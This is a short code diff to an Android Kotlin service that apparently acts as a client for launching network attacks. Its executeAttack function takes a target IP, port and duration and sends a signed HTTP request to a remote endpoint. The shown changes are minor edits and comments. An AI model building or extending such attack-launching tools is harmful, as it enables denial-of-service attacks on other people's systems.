@@ -22,6 +22,7 @@ import android.widget.*
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import org.json.JSONObject
+import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
 import javax.crypto.Mac
@@ -97,6 +98,7 @@ class FloatingService : Service() {
         super.onCreate()
         instance = this
 
+        // Notification Channel
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel("floating_channel", "Floating Service", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
@@ -241,6 +243,7 @@ class FloatingService : Service() {
         }
     }
 
+    // 🩸 MAIN ATTACK FUNCTION (Coroutines & Logging)
     private fun executeAttack(ip: String, port: Int, durationSec: Int) {
         serviceScope.launch {
             var ok = false
@@ -278,11 +281,13 @@ class FloatingService : Service() {
                 val signature = mac.doFinal(body.toByteArray()).joinToString("") { String.format("%02x", it) }
                 
                 conn.setRequestProperty("X-App-Signature", signature)
-                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
+
+                OutputStreamWriter(conn.outputStream).use { it.write(body) }
 
                 val code = conn.responseCode
                 val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.readText() ?: ""
 
+                // 🩸 LOG FOR DEBUGGING
                 Log.d("ATTACK_DEBUG", "HTTP Code: $code | Response: $resp")
 
                 withContext(Dispatchers.Main) {
